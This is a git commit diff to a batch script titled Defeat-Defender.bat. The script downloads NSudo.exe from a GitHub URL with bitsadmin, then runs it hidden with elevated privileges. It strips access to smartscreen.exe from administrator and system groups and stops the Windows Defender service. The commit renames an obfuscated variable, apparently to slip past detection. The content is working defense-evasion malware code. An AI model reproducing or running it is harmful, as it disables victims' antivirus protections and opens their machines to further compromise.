3e94fea2978caf288075ca8e59020fee2934cdf7
swagkarna <46685308+swagkarna@users.noreply.github.com>
2021-05-20 22:52:02 +0530

    Update Defeat-Defender.bat

--- Defeat-Defender.bat
+++ Defeat-Defender.bat
@@ -71,12 +71,12 @@ cd  %temp%
 
 bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
 
-set xxx=%systemroot%
+set xxxx=%systemroot%
 
 set graysuitlovespinksuit=System32
 
 
-NSudo.exe -U:T -ShowWindowMode:Hide icacls "%xxx%\%graysuitlovespinksuit%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+NSudo.exe -U:T -ShowWindowMode:Hide icacls "%xxxx%\%graysuitlovespinksuit%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
